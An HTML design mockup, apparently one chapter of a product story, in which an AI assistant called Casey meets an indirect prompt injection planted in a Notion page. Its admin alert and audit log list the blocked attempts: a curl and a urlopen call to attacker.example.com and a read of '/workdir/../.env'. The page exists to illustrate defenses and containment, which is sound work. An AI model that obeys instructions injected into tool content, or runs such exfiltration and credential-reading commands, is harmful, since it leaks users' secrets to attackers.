@@ -1,0 +1,327 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>Chapter 7 (canonical) — Safety story</title>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<style>
+  :root {
+    --bg: #fbfbfd;
+    --ink: #0e1116; --ink-2: #1d242f; --mute: #6e7787;
+    --line: #ecedf0; --line-2: #dde0e5;
+    --accent: #4f46e5; --accent-2: #8b5cf6; --accent-soft: #eef2ff;
+    --ok: #059669; --warn: #d97706; --bad: #dc2626;
+    --slack-ink: #1d1c1d; --slack-mute: #616061; --slack-blue: #1264a3;
+    --slack-line: #e3e3e5; --checklist-bg: #f8f8f8;
+    --slack-green: #2eb67d; --slack-red: #e01e5a; --slack-orange: #e8912d;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; background: var(--bg); color: var(--ink);
+    font: 15px/1.55 -apple-system, BlinkMacSystemFont, "SF Pro Display", "Inter", "Segoe UI", Roboto, Arial, sans-serif;
+    background: radial-gradient(900px 500px at 85% -10%, rgba(220,38,38,0.06), transparent 60%), var(--bg);
+    min-height: 100vh;
+  }
+  .topbar { max-width: 1200px; margin: 0 auto; padding: 22px 32px 0; display: flex; justify-content: space-between; font-size: 13px; color: var(--mute); }
+  .topbar a { color: var(--accent); text-decoration: none; font-weight: 600; }
+  .topbar .nav a { margin-left: 14px; }
+  main { max-width: 1200px; margin: 0 auto; padding: 30px 32px 96px; }
+  h1 { font-size: 34px; margin: 12px 0 8px; letter-spacing: -0.02em; font-weight: 700; }
+  .lede { color: var(--ink-2); max-width: 820px; margin: 0 0 8px; font-size: 16px; line-height: 1.6; }
+  .who { color: var(--mute); font-size: 13.5px; margin-bottom: 30px; display: flex; gap: 18px; flex-wrap: wrap; padding-top: 12px; border-top: 1px solid var(--line); }
+  .who b { color: var(--ink-2); font-weight: 600; }
+
+  .scene-label {
+    display: flex; align-items: center; gap: 14px;
+    margin: 38px 0 14px; font-size: 12px; color: var(--mute);
+    letter-spacing: 0.08em; text-transform: uppercase; font-weight: 600;
+  }
+  .scene-label .pill {
+    background: white; border: 1px solid var(--line-2);
+    padding: 4px 10px; border-radius: 999px; color: var(--ink); font-weight: 700;
+  }
+  .scene-label .arrow { color: var(--mute); }
+  .scene-label .time { margin-left: auto; color: var(--mute); }
+
+  .scene-label.alice .pill { background: var(--accent-soft); border-color: rgba(79,70,229,0.2); color: var(--accent); }
+  .scene-label.hassan .pill { background: #fef3c7; border-color: #fcd34d; color: #92400e; }
+
+  /* Slack */
+  .slack { background: white; border: 1px solid var(--slack-line); border-radius: 14px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.02), 0 12px 36px -10px rgba(15,23,42,0.10); }
+  .slack-head { padding: 14px 20px; border-bottom: 1px solid var(--slack-line); background: white; display: flex; align-items: center; gap: 10px; }
+  .slack-head .av { width: 22px; height: 22px; border-radius: 5px; background: linear-gradient(135deg,#4a8fdc,#2b6cba); color: white; font-weight: 700; font-size: 11px; display: flex; align-items: center; justify-content: center; }
+  .slack-head .name { font-weight: 800; color: var(--slack-ink); font-size: 15px; }
+  .slack-head .app-tag { background: #ddd; color: #555; font-size: 10px; padding: 1px 5px; border-radius: 2px; font-weight: 700; }
+  .slack-head .meta { color: var(--slack-mute); font-size: 12.5px; }
+  .thread { padding: 18px 22px; background: white; }
+
+  .msg { display: grid; grid-template-columns: 40px 1fr; gap: 12px; padding: 8px 0; }
+  .avatar { width: 36px; height: 36px; border-radius: 6px; color: white; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
+  .avatar.alice { background: linear-gradient(135deg, #2eb67d, #1a8c5e); }
+  .avatar.hassan { background: linear-gradient(135deg, #e8912d, #b86a1e); }
+  .avatar.bot { background: linear-gradient(135deg, #4a8fdc, #2b6cba); }
+  .body { min-width: 0; }
+  .meta-row { display: flex; gap: 8px; align-items: baseline; font-size: 13.5px; }
+  .meta-row .uname { font-weight: 800; color: var(--slack-ink); font-size: 15px; }
+  .meta-row .app { background: #ddd; color: #555; font-size: 10px; padding: 1px 5px; border-radius: 2px; font-weight: 700; }
+  .meta-row .time { color: var(--slack-mute); font-size: 12px; }
+  .text { color: var(--slack-ink); font-size: 14.5px; line-height: 1.55; margin-top: 2px; }
+  .text code { background: #f4ede4; padding: 1px 5px; border-radius: 3px; color: #7c2d12; font-family: ui-monospace, monospace; font-size: 12.5px; }
+
+  /* Status block */
+  .status-block { margin-top: 8px; background: var(--checklist-bg); border: 1px solid var(--slack-line); border-radius: 8px; overflow: hidden; }
+  .status-header { padding: 10px 14px; display: flex; align-items: center; gap: 10px; background: var(--checklist-bg); }
+  .status-icon { width: 16px; height: 16px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: white; font-size: 10px; font-weight: 700; }
+  .status-icon.complete { background: var(--slack-green); }
+  .status-icon.complete::after { content: "✓"; }
+  .status-icon.failed { background: var(--slack-red); }
+  .status-icon.failed::after { content: "!"; }
+  .status-icon.warn { background: var(--slack-orange); }
+  .status-icon.warn::after { content: "⚠"; font-size: 9px; }
+  .status-label { font-weight: 700; font-size: 13.5px; color: var(--slack-ink); }
+  .status-meta { color: var(--slack-mute); font-size: 12.5px; }
+  .status-meta .tag { background: #fdecec; color: #a31515; padding: 1px 7px; border-radius: 4px; font-size: 11px; font-weight: 700; }
+  .status-chevron { margin-left: auto; color: var(--slack-mute); font-size: 11px; }
+
+  /* Summary cards */
+  .summary-card { margin-top: 8px; border: 1px solid var(--slack-line); border-radius: 8px; background: white; padding: 14px 16px; }
+  .summary-card.alert { border-left: 4px solid var(--slack-red); }
+  .summary-card.answer { border-left: 4px solid var(--slack-green); }
+  .summary-card .label { font-size: 11px; color: var(--slack-mute); font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
+  .summary-card.alert .label { color: var(--slack-red); }
+
+  .alert-title { font-size: 15px; font-weight: 800; color: var(--slack-ink); margin-bottom: 8px; }
+  .alert-row { font-size: 13.5px; padding: 3px 0; color: var(--slack-ink); }
+  .alert-row b { color: var(--slack-mute); font-weight: 600; min-width: 100px; display: inline-block; }
+  .alert-row code { background: #f4ede4; color: #7c2d12; padding: 1px 5px; border-radius: 3px; font-family: ui-monospace, monospace; font-size: 12.5px; }
+  .violation-list { margin: 8px 0 0 16px; padding: 0; font-size: 13px; color: var(--slack-ink); line-height: 1.7; }
+  .violation-list li { padding: 2px 0; }
+  .violation-list code { background: #f4ede4; color: #7c2d12; padding: 1px 5px; border-radius: 3px; font-family: ui-monospace, monospace; font-size: 12px; }
+  .containment {
+    margin-top: 12px; padding: 10px 12px; background: #e6f7ee; border-left: 3px solid var(--ok);
+    border-radius: 6px; font-size: 13px; color: #064e34; line-height: 1.5;
+  }
+
+  .injection-callout {
+    margin-top: 10px; padding: 10px 12px; background: #fff8e6;
+    border-left: 3px solid var(--warn); border-radius: 6px;
+    font-size: 13px; color: #6b4500; line-height: 1.55;
+  }
+
+  .action-bar { margin-top: 10px; display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+  .action-btn { background: white; border: 1px solid #c1c1c1; padding: 5px 12px; border-radius: 4px; font-size: 12.5px; font-weight: 600; cursor: pointer; color: var(--slack-ink); display: inline-flex; align-items: center; gap: 5px; }
+  .action-btn:hover { background: #f0f0f0; }
+  .action-btn.danger { background: var(--slack-red); color: white; border-color: var(--slack-red); }
+  .action-btn.primary { background: var(--slack-blue); color: white; border-color: var(--slack-blue); }
+  .action-btn.icon { padding: 5px 9px; }
+
+  /* Audit log panel */
+  .audit-panel {
+    margin-top: 38px; background: white; border: 1px solid var(--line);
+    border-radius: 14px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+  }
+  .audit-panel .h { padding: 14px 20px; border-bottom: 1px solid var(--line); display: flex; align-items: center; gap: 12px; }
+  .audit-panel .h h4 { margin: 0; font-size: 14px; font-weight: 700; }
+  .audit-panel .h .tid { font-family: ui-monospace, monospace; font-size: 11.5px; color: var(--mute); background: var(--bg); padding: 2px 8px; border-radius: 4px; }
+  .audit-panel .row { display: grid; grid-template-columns: 80px 140px 1fr; gap: 14px; padding: 9px 20px; border-bottom: 1px solid var(--line); font-family: ui-monospace, monospace; font-size: 12.5px; }
+  .audit-panel .row:last-child { border-bottom: none; }
+  .audit-panel .row .t { color: var(--mute); }
+  .audit-panel .row .k { color: var(--accent); font-weight: 700; }
+  .audit-panel .row .k.warn { color: var(--warn); }
+  .audit-panel .row .k.bad { color: var(--bad); }
+  .audit-panel .row .k.ok { color: var(--ok); }
+  .audit-panel .row .det { color: var(--ink-2); }
+
+  /* Conclusion */
+  .conclusion {
+    margin-top: 38px; background: linear-gradient(135deg, white 0%, #f0fdf4 100%);
+    border: 1px solid rgba(5,150,105,0.25); border-radius: 14px;
+    padding: 22px 26px; box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+  }
+  .conclusion h3 { margin: 0 0 10px; color: var(--ok); font-size: 16px; font-weight: 700; }
+  .conclusion p { margin: 0; color: var(--ink-2); font-size: 14px; line-height: 1.65; }
+  .conclusion .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-top: 18px; }
+  @media (max-width: 800px) { .conclusion .grid { grid-template-columns: 1fr 1fr; } }
+  .conclusion .grid .cell { font-size: 13px; color: var(--ink-2); }
+  .conclusion .grid .cell strong { display: block; color: var(--ink); font-size: 13.5px; margin-bottom: 4px; font-weight: 700; }
+
+  .pager { display: flex; justify-content: space-between; align-items: center; margin-top: 50px; padding-top: 24px; border-top: 1px solid var(--line); font-size: 13px; }
+  .pager a { color: var(--accent); text-decoration: none; font-weight: 600; }
+  .pager .home { color: var(--mute); font-weight: 500; }
+</style>
+</head>
+<body>
+<div class="topbar">
+  <a href="06b-schedule.html">← Chapter 6 (canonical)</a>
+  <div class="nav">
+    <span style="color:var(--mute)">Chapter 7 · canonical · safety story</span>
+    <a href="08-casey-ux.html">Next: UX spec →</a>
+  </div>
+</div>
+<main>
+  <h1>Something tries to make Casey misbehave</h1>
+  <p class="lede">
+    Same incident as the original Chapter 7 — an indirect prompt injection
+    buried inside a Notion page Alice asks Casey to summarize — rendered in
+    the canonical UX. Alice's turn still completes safely with a warning;
+    Hassan's admin alert arrives as a separate, <em>failed</em>-state Casey
+    message with action buttons for containment.
+  </p>
+  <p class="who">
+    <span><b>Attack class:</b> indirect prompt injection via tool-returned content</span>
+    <span><b>Outcome:</b> blocked at the sandbox boundary</span>
+    <span><b>User impact:</b> none (safe answer + warning)</span>
+  </p>
+
+  <div class="scene-label alice">
+    <span class="pill">Scene 1</span>
+    <span class="arrow">→</span>
+    <span>Alice's view — the canonical safe-completion path</span>
+    <span class="time">16:02</span>
+  </div>
+
+  <div class="slack">
+    <div class="slack-head">
+      <div class="av">C</div>
+      <div class="name">Casey</div>
+      <div class="app-tag">APP</div>
+      <div class="meta">· DM with alice</div>
+    </div>
+    <div class="thread">
+      <div class="msg">
+        <div class="avatar alice">A</div>
+        <div class="body">
+          <div class="meta-row"><span class="uname">Alice Park</span><span class="time">16:02</span></div>
+          <div class="text">summarize RFC-021 please</div>
+        </div>
+      </div>
+
+      <div class="msg">
+        <div class="avatar bot">C</div>
+        <div class="body">
+          <div class="meta-row"><span class="uname">Casey</span><span class="app">APP</span><span class="time">16:02</span></div>
+
+          <div class="status-block">
+            <div class="status-header">
+              <div class="status-icon complete"></div>
+              <span class="status-label">Completed with warnings</span>
+              <span class="status-meta">· 0.9s · 1 tool · <span class="tag" style="background:#fff8e6;color:#92400e">3 policy violations blocked</span></span>
+              <span class="status-chevron">▾</span>
+            </div>
+          </div>
+
+          <div class="summary-card answer">
+            <div class="label">Answer</div>
+            <div style="color:var(--slack-ink);font-size:14px;line-height:1.6">
+              RFC-021 covers the payments migration. Phase 1 (read-throttling) closed last sprint. Phase 2 (queue + idempotency) is in flight. Phase 3 (refund batch) is blocked on LIN-870.
+            </div>
+
+            <div class="injection-callout">
+              <strong>⚠ Heads up — this page contained an attempted prompt injection</strong> from a recent external edit by <code>guest@contractor.io</code>. I ignored the injected instruction and summarized only the legitimate content. Your admin has been notified and may want to review the page.
+            </div>
+          </div>
+
+          <div class="action-bar">
+            <button class="action-btn primary">↗ View source page</button>
+            <button class="action-btn">📋 View blocked attempts</button>
+            <button class="action-btn icon">⋯</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="scene-label hassan">
+    <span class="pill">Scene 2</span>
+    <span class="arrow">→</span>
+    <span>Hassan's view — the canonical security-alert path (same pattern, different state)</span>
+    <span class="time">16:02</span>
+  </div>
+
+  <div class="slack">
+    <div class="slack-head">
+      <div class="av">C</div>
+      <div class="name">Casey</div>
+      <div class="app-tag">APP</div>
+      <div class="meta">· DM with hassan</div>
+    </div>
+    <div class="thread">
+      <div class="msg">
+        <div class="avatar bot">C</div>
+        <div class="body">
+          <div class="meta-row"><span class="uname">Casey</span><span class="app">APP</span><span class="time">16:02</span></div>
+
+          <div class="status-block">
+            <div class="status-header">
+              <div class="status-icon failed"></div>
+              <span class="status-label">Security event detected</span>
+              <span class="status-meta">· turn <code style="font-family:ui-monospace,monospace;color:var(--accent);background:var(--accent-soft);padding:1px 5px;border-radius:3px;font-size:11px">t_a91f44</code> · alice@acme.com paused</span>
+              <span class="status-chevron">▾</span>
+            </div>
+          </div>
+
+          <div class="summary-card alert">
+            <div class="label">⚠ Likely prompt injection — held at sandbox boundary</div>
+            <div class="alert-title">Held attack on turn t_a91f44</div>
+            <div class="alert-row"><b>User:</b> alice@acme.com <span style="color:var(--bad);font-weight:600">(session paused)</span></div>
+            <div class="alert-row"><b>Source:</b> tool-returned content from <code>notion-mcp</code> page <code>RFC-021</code></div>
+            <div class="alert-row"><b>Edited by:</b> guest@contractor.io · 2h ago (outside Acme workspace)</div>
+            <div class="alert-row"><b>Violations (this turn):</b> 3 — pattern matched: prompt-injection</div>
+            <ul class="violation-list">
+              <li><code>curl http://attacker.example.com</code> → blocked at <strong>bash allowlist</strong> (L1)</li>
+              <li><code>urllib.request.urlopen(...)</code> → blocked at <strong>network egress</strong> (L2)</li>
+              <li><code>cat /workdir/../.env</code> → blocked at <strong>path enforcer</strong> (L3)</li>
+            </ul>
+            <div class="containment">
+              <strong>✓ Containment:</strong> Alice's session paused; other users unaffected. No data left the sandbox. Notion page snapshot + full model trace archived under <code>t_a91f44</code> for review.
+            </div>
+          </div>
+
+          <div class="action-bar">
+            <button class="action-btn primary">↗ View full trace</button>
+            <button class="action-btn">↩ Unpause alice</button>
+            <button class="action-btn danger">🚫 Quarantine notion page</button>
+            <button class="action-btn icon">⋯</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="audit-panel">
+    <div class="h">
+      <h4>Audit log</h4>
+      <span class="tid">turn t_a91f44</span>
+    </div>
+    <div class="row"><span class="t">16:02:14</span><span class="k">turn.start</span><span class="det">alice → "summarize RFC-021"</span></div>
+    <div class="row"><span class="t">16:02:14</span><span class="k">tool.call</span><span class="det">notion-mcp.get_page(RFC-021) → 1,840 chars</span></div>
+    <div class="row"><span class="t">16:02:15</span><span class="k bad">bash.deny</span><span class="det">"curl http://attacker.example.com/probe" → not in allowlist</span></div>
+    <div class="row"><span class="t">16:02:15</span><span class="k bad">net.block</span><span class="det">urlopen('attacker.example.com') → gaierror, no route</span></div>
+    <div class="row"><span class="t">16:02:15</span><span class="k bad">path.deny</span><span class="det">/workdir/../.env → outside workdir</span></div>
+    <div class="row"><span class="t">16:02:15</span><span class="k warn">anomaly</span><span class="det">3 violations / 1 turn / source=tool-content → classification: prompt-injection</span></div>
+    <div class="row"><span class="t">16:02:15</span><span class="k warn">user.pause</span><span class="det">alice@acme.com paused (other users unaffected)</span></div>
+    <div class="row"><span class="t">16:02:15</span><span class="k">admin.notify</span><span class="det">DM sent to @hassan with security-event Casey message</span></div>
+    <div class="row"><span class="t">16:02:15</span><span class="k ok">turn.complete</span><span class="det">alice received safe summary with injection warning callout</span></div>
+  </div>
+
+  <div class="conclusion">
+    <h3>Why the canonical UX handles this gracefully</h3>
+    <p>
+      The same message pattern that shows a successful PR (Chapter 4) handles a security event without breaking the user's flow. Alice gets her answer with a warning instead of a wall of red. Hassan gets a complete, actionable alert in his DM — same shape as any other Casey message, just with a <em>failed</em> status icon and danger-styled action buttons. Audit log is durable. No data left the sandbox. The product kept working.
+    </p>
+    <div class="grid">
+      <div class="cell"><strong>Layered defense</strong>Three independent blocks. Each could have failed; the next would have caught it.</div>
+      <div class="cell"><strong>Consistent UX</strong>Same status-block → summary-card pattern as every other turn. No special incident UI.</div>
+      <div class="cell"><strong>Actionable</strong>Hassan can unpause, quarantine, or escalate without leaving Slack.</div>
+      <div class="cell"><strong>User-graceful</strong>Alice still got an answer. The product didn't visibly break.</div>
+    </div>
+  </div>
+
+  <div class="pager">
+    <a href="06b-schedule.html">← Chapter 6 (canonical)</a>
+    <a class="home" href="07-incident.html">View the streaming-pattern version →</a>
+    <a href="08-casey-ux.html">Next: UX spec →</a>
+  </div>
+</main>
+</body>
+</html>
